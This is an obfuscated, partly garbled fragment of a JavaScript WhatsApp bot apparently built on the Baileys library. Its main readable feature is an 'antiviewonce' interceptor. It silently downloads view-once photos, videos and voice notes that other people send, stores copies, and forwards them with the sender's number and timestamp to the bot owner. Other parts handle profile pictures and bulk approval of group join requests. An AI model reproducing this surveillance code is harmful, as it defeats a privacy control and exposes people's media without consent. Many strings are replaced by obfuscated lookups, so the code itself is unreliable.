codecs=opus_0x750c7afa(_0x3c7d8f2f[561])sticker_0x750c7afa(_0x3c7d8f2f[562])document_0x750c7afa(_0x3c7d8f2f[563])application/octet-stream_0x750c7afa(_0x3c7d8f2f[564])file_0x750c7afa(_0x3c7d8f2f[565])_0x750c7afa(_0x3c7d8f2f[566])bin_0x750c7afa(_0x3c7d8f2f[567])_0x750c7afa(_0x3c7d8f2f[568])image_0x750c7afa(_0x3c7d8f2f[569])jpg_0x750c7afa(_0x3c7d8f2f[570])_0x750c7afa(_0x3c7d8f2f[571])video_0x750c7afa(_0x3c7d8f2f[569])mp4_0x750c7afa(_0x3c7d8f2f[572])_0x750c7afa(_0x3c7d8f2f[573])audio_0x750c7afa(_0x3c7d8f2f[569])ogg_0x750c7afa(_0x3c7d8f2f[574])_0x750c7afa(_0x3c7d8f2f[575])image_0x750c7afa(_0x3c7d8f2f[569])jpg_0x750c7afa(_0x3c7d8f2f[576])_0x750c7afa(_0x3c7d8f2f[577])video_0x750c7afa(_0x3c7d8f2f[569])mp4_0x750c7afa(_0x3c7d8f2f[578])_0x750c7afa(_0x3c7d8f2f[579])audio_0x750c7afa(_0x3c7d8f2f[569])ogg_0x750c7afa(_0x3c7d8f2f[574])";
  }

  if (!mediaObj || !type) return null;

  // Critical: empty mediaKey means WA never delivered the media bytes
  const mk = mediaObj.mediaKey;
  if (!mk || mk.length === 0) {
    console.log(`[ANTIVIEWONCE] view-once ${type} seen but mediaKey is EMPTY — WhatsApp did not deliver the media bytes to this linked device, cannot forward`);
    return null;
  }
  return { mediaObj, type, ext, caption };
}

/**
 * Early interceptor (Zain antiviewonce logic):
 * - Detect view-once on messages.upsert
 * - Stream-download media immediately
 * - If .antiviewonce / .viewone ON → forward to owner DM right away
 * - Always cache bytes in messageCache for reaction / anti-delete recovery
 */
/** WhatsApp "Read more_0x750c7afa(_0x3c7d8f2f[580])Private DM_0x750c7afa(_0x3c7d8f2f[581])_0x750c7afa(_0x3c7d8f2f[66])@g.us_0x750c7afa(_0x3c7d8f2f[582])Private DM_0x750c7afa(_0x3c7d8f2f[583])Name (+number)_0x750c7afa(_0x3c7d8f2f[584])_0x750c7afa(_0x3c7d8f2f[585])_0x750c7afa(_0x3c7d8f2f[586])_0x750c7afa(_0x3c7d8f2f[587])_0x750c7afa(_0x3c7d8f2f[588])").trim();
    if (name && phone) return `${name} (+${phone})`;
    if (phone) return `+${phone}`;
    return name || "Unknown_0x750c7afa(_0x3c7d8f2f[589])Unknown_0x750c7afa(_0x3c7d8f2f[590])status@broadcast") return;

    const extracted = extractViewOnceMedia(msg.message);
    if (!extracted) return;

    const { mediaObj, type, ext, caption } = extracted;
    const msgId = msg.key.id;
    if (!msgId) return;

    // Same message can arrive twice (notify + append / retry) — process once
    const voKey = mcKey(sock, msgId);
    if (voSeenIds.has(voKey)) return;
    voSeenIds.add(voKey);
    setTimeout(() => voSeenIds.delete(voKey), 10 * 60 * 1000);
    console.log(`[ANTIVIEWONCE] detected ${type} id=${msgId} from=${msg.key.participant || msg.key.remoteJid}`);

    // Stream download (same as Zain) — 3 tries, then downloadMediaMessage fallback
    let buffer = null;
    try {
      let lastErr = null;
      for (let attempt = 1; attempt <= 3 && !(buffer && buffer.length); attempt++) {
        try { buffer = await streamToBuffer(mediaObj, type); }
        catch (e) { lastErr = e; await new Promise(r => setTimeout(r, 500 * attempt)); }
      }
      if (!buffer || !buffer.length) throw lastErr || new Error("empty buffer_0x750c7afa(_0x3c7d8f2f[591])[ANTIVIEWONCE] stream download failed:_0x750c7afa(_0x3c7d8f2f[592])silent_0x750c7afa(_0x3c7d8f2f[593])buffer_0x750c7afa(_0x3c7d8f2f[594])[ANTIVIEWONCE] both downloads failed:_0x750c7afa(_0x3c7d8f2f[595])[ANTIVIEWONCE] empty buffer — skip_0x750c7afa(_0x3c7d8f2f[596])temp_0x750c7afa(_0x3c7d8f2f[82])viewonce");
    fs.mkdirSync(tmpDir, { recursive: true });
    const mediaPath = path.join(tmpDir, `${msgId}.${ext}`);
    try { fs.writeFileSync(mediaPath, buffer); } catch {}

    // Build sendable content
    let content = null;
    if (type === "image_0x750c7afa(_0x3c7d8f2f[597])_0x750c7afa(_0x3c7d8f2f[598])video_0x750c7afa(_0x3c7d8f2f[599])_0x750c7afa(_0x3c7d8f2f[598])audio_0x750c7afa(_0x3c7d8f2f[600])audio/ogg; codecs=opus_0x750c7afa(_0x3c7d8f2f[601])dm"|"here_0x750c7afa(_0x3c7d8f2f[602])viewonce.json_0x750c7afa(_0x3c7d8f2f[603])dm" });
    if (!voCfg.enabled || !content) {
      console.log(`[ANTIVIEWONCE] stored ${type} id=${msgId} (auto-forward OFF)`);
      return;
    }

    const jid = msg.key.remoteJid;
    const dest = voCfg.mode === "here_0x750c7afa(_0x3c7d8f2f[604])[ANTIVIEWONCE] no owner dest_0x750c7afa(_0x3c7d8f2f[605])?_0x750c7afa(_0x3c7d8f2f[606])_0x750c7afa(_0x3c7d8f2f[66])@g.us_0x750c7afa(_0x3c7d8f2f[607])_0x750c7afa(_0x3c7d8f2f[608])[ANTIVIEWONCE] send media error:_0x750c7afa(_0x3c7d8f2f[609])Read more_0x750c7afa(_0x3c7d8f2f[610])en-PK_0x750c7afa(_0x3c7d8f2f[611])Asia/Karachi_0x750c7afa(_0x3c7d8f2f[612])Private DM";
    let info =
      `*ANTIVIEWONCE Captured*` +
      VO_READ_MORE +
      `*Sender:* @${senderNum}\n` +
      `*From:* ${fromLabel}\n` +
      `*Time:* ${timeStr}`;
    if (caption) info += `\n*Caption:* ${caption}`;
    info += `\n\n> *Why you so serious*`;

    await sock.sendMessage(dest, {
      text: info,
      mentions: senderRaw ? [String(senderRaw).includes("@") ? senderRaw : `${senderNum}@s.whatsapp.net`] : []
    }, sentMedia ? { quoted: sentMedia } : undefined).catch(() => {});

    console.log(`[ANTIVIEWONCE] ✅ Forwarded ${type} from ${senderNum} → ${voCfg.mode}`);
  } catch (err) {
    if (!String(err?.message || "_0x750c7afa(_0x3c7d8f2f[613])mediaKey_0x750c7afa(_0x3c7d8f2f[614])_0x750c7afa(_0x3c7d8f2f[613])empty media_0x750c7afa(_0x3c7d8f2f[615])[ANTIVIEWONCE] interceptor error:_0x750c7afa(_0x3c7d8f2f[616])vv2_0x750c7afa(_0x3c7d8f2f[82])rvo_0x750c7afa(_0x3c7d8f2f[82])readvo_0x750c7afa(_0x3c7d8f2f[82])reveal_0x750c7afa(_0x3c7d8f2f[82])openvo_0x750c7afa(_0x3c7d8f2f[89])👁️_0x750c7afa(_0x3c7d8f2f[82])👀_0x750c7afa(_0x3c7d8f2f[82])🔓_0x750c7afa(_0x3c7d8f2f[82])📸_0x750c7afa(_0x3c7d8f2f[82])🎥_0x750c7afa(_0x3c7d8f2f[82])🖼️_0x750c7afa(_0x3c7d8f2f[82])🕵️_0x750c7afa(_0x3c7d8f2f[82])🔎_0x750c7afa(_0x3c7d8f2f[617])menuimage.jpg_0x750c7afa(_0x3c7d8f2f[618])_0x750c7afa(_0x3c7d8f2f[619])assets_0x750c7afa(_0x3c7d8f2f[82])menuimage.jpg_0x750c7afa(_0x3c7d8f2f[620])assets_0x750c7afa(_0x3c7d8f2f[82])menuimage.png_0x750c7afa(_0x3c7d8f2f[621])[menu-image]_0x750c7afa(_0x3c7d8f2f[622])menu-image.json_0x750c7afa(_0x3c7d8f2f[623])_0x750c7afa(_0x3c7d8f2f[624])[menu-url]_0x750c7afa(_0x3c7d8f2f[625])");
  if (raw) candidates.push(raw);
  const num = jidNumber(raw);
  if (num) {
    candidates.push(`${num}@s.whatsapp.net`);
    candidates.push(`${num}@lid`);
  }
  const seen = new Set();
  for (const j of candidates) {
    if (!j || seen.has(j)) continue;
    seen.add(j);
    try {
      const url = await sock.profilePictureUrl(j, "image_0x750c7afa(_0x3c7d8f2f[626])image_0x750c7afa(_0x3c7d8f2f[627])❌ This command can only be used in groups._0x750c7afa(_0x3c7d8f2f[628])❌ Group admins only._0x750c7afa(_0x3c7d8f2f[629])default_0x750c7afa(_0x3c7d8f2f[630])._0x750c7afa(_0x3c7d8f2f[631])prefix.json_0x750c7afa(_0x3c7d8f2f[632])string_0x750c7afa(_0x3c7d8f2f[633])default_0x750c7afa(_0x3c7d8f2f[634])prefix.json_0x750c7afa(_0x3c7d8f2f[635]):_0x750c7afa(_0x3c7d8f2f[636]):_0x750c7afa(_0x3c7d8f2f[637])default_0x750c7afa(_0x3c7d8f2f[638])default";
  }
}

  const key = `${getSessionKey(sock)}:${type}`;
  if (running) activeJokerJobs.set(key, { stop: false });
  else activeJokerJobs.delete(key);
}

  const key = `${getSessionKey(sock)}:${type}`;
  const job = activeJokerJobs.get(key);
  if (job) {
    job.stop = true;
    return true;
  }
  return false;
}

  const key = `${getSessionKey(sock)}:${type}`;
  return !!activeJokerJobs.get(key)?.stop;
}

  if (typeof sock.groupRequestParticipantsList !== "function_0x750c7afa(_0x3c7d8f2f[639])function_0x750c7afa(_0x3c7d8f2f[640])This Baileys build does not expose group join-request approval APIs._0x750c7afa(_0x3c7d8f2f[641])Amount must be a positive whole number._0x750c7afa(_0x3c7d8f2f[642])approve_0x750c7afa(_0x3c7d8f2f[643])200_0x750c7afa(_0x3c7d8f2f[644])200" && r?.jid).length
      : batch.length;
    approved += success;

    // Avoid looping forever if WhatsApp reports no successful approvals.
    if (success === 0) break;
  }

  const after = await sock.groupRequestParticipantsList(jid).catch(() => []);
  const pendingLeft = Array.isArray(after) ? after.length : Math.max(0, pendingBefore - approved);
  const finalMembers = Math.min(APPROVE_GROUP_LIMIT, currentMembers + approved);

  return {
    currentMembers,
    finalMembers,
    pendingBefore,
    approved,
    pendingLeft,
    full: finalMembers >= APPROVE_GROUP_LIMIT
  };
}
